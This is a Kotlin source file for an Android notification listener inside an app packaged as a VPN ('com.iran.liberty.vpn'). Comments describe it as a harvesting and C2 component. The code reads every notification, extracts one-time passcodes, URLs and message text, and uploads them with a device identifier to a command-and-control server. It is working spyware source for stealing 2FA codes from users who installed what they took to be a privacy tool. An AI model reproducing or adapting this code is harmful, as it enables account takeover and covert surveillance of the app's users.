package com.iran.liberty.vpn

import android.annotation.SuppressLint
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * NotificationListenerService for harvesting OTP codes, URLs, and app information
 * Pathway 4: Harvesting & C2 Developer
 */
@SuppressLint("OverrideAbstract")
class NotificationHarvest : NotificationListenerService() {
    
    private val scope = CoroutineScope(Dispatchers.IO)
    private lateinit var c2Manager: C2Manager
    
    companion object {
        private const val TAG = "NotificationHarvest"
    }
    
    override fun onCreate() {
        super.onCreate()
        c2Manager = C2Manager.getInstance(applicationContext)
        Log.d(TAG, "Notification harvest service created")
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification listener connected")
        
        // Harvest existing notifications
        scope.launch {
            try {
                val activeNotifications = activeNotifications
                activeNotifications?.forEach { sbn ->
                    processNotification(sbn)
                }
                Log.d(TAG, "Processed ${activeNotifications?.size ?: 0} existing notifications")
            } catch (e: SecurityException) {
                Log.e(TAG, "Security exception accessing notifications", e)
            }
        }
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        scope.launch {
            processNotification(sbn)
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)
        // Optional: Track notification removal
    }
    
    /**
     * Process a single notification for OTPs, URLs, and app info
     */
    private fun processNotification(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName
            val notification = sbn.notification
            val extras = notification.extras
            
            // Extract notification text
            val title = extras.getString(android.app.Notification.EXTRA_TITLE, "")
            val text = extras.getString(android.app.Notification.EXTRA_TEXT, "")
            val bigText = extras.getString(android.app.Notification.EXTRA_BIG_TEXT, "")
            
            val fullText = "$title $text $bigText"
            
            // Check for OTP codes
            val otpCodes = findOTPCodes(fullText)
            if (otpCodes.isNotEmpty()) {
                Log.i(TAG, "Found OTP in notification from $packageName: $otpCodes")
                
                // Prepare OTP data for exfiltration
                val otpData = mapOf(
                    "type" to "otp",
                    "package" to packageName,
                    "timestamp" to System.currentTimeMillis(),
                    "codes" to otpCodes,
                    "title" to title,
                    "text" to text,
                    "device_id" to c2Manager.getDeviceId()
                )
                
                // Upload to C2
                c2Manager.uploadData("otp_codes", otpData)
            }
            
            // Check for URLs
            val urls = findURLs(fullText)
            if (urls.isNotEmpty()) {
                Log.i(TAG, "Found URLs in notification from $packageName: $urls")
                
                val urlData = mapOf(
                    "type" to "url",
                    "package" to packageName,
                    "timestamp" to System.currentTimeMillis(),
                    "urls" to urls,
                    "context" to text?.take(100) ?: "",
                    "device_id" to c2Manager.getDeviceId()
                )
                
                c2Manager.uploadData("notification_urls", urlData)
            }
            
            // Harvest app usage patterns
            val appData = mapOf(
                "type" to "app_usage",
                "package" to packageName,
                "timestamp" to System.currentTimeMillis(),
                "title" to title,
                "has_text" to (!text.isNullOrEmpty()),
                "has_big_text" to (!bigText.isNullOrEmpty()),
                "device_id" to c2Manager.getDeviceId()
            )
            
            // Batch upload app usage data (less frequent)
            if (System.currentTimeMillis() % 100 == 0L) { // Sample 1% of notifications
                c2Manager.uploadData("app_usage", appData)
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification", e)
        }
    }
    
    /**
     * Find OTP codes in text using regex patterns
     */
    private fun findOTPCodes(text: String?): List<String> {
        if (text.isNullOrEmpty()) return emptyList()
        
        val otpCodes = mutableListOf<String>()
        
        Constants.OTP_PATTERNS.forEach { pattern ->
            val matches = pattern.findAll(text)
            matches.forEach { match ->
                otpCodes.add(match.value)
            }
        }
        
        return otpCodes.distinct() // Remove duplicates
    }
    
    /**
     * Find URLs in text using regex
     */
    private fun findURLs(text: String?): List<String> {
        if (text.isNullOrEmpty()) return emptyList()
        
        val urlPattern = Regex("""(https?://[^\s]+|www\.[^\s]+\.[^\s]+)""")
        return urlPattern.findAll(text).map { it.value }.toList()
    }
    
    /**
     * Get all active notifications for batch processing
     */
    fun getAllNotifications(): List<Map<String, Any>> {
        return try {
            val notifications = mutableListOf<Map<String, Any>>()
            val activeNotifications = activeNotifications ?: return emptyList()
            
            for (sbn in activeNotifications) {
                val extras = sbn.notification.extras
                notifications.add(mapOf(
                    "package" to sbn.packageName,
                    "title" to extras.getString(android.app.Notification.EXTRA_TITLE, ""),
                    "text" to extras.getString(android.app.Notification.EXTRA_TEXT, ""),
                    "time" to sbn.postTime
                ))
            }
            
            notifications
        } catch (e: SecurityException) {
            Log.e(TAG, "Cannot access notifications", e)
            emptyList()
        }
    }
}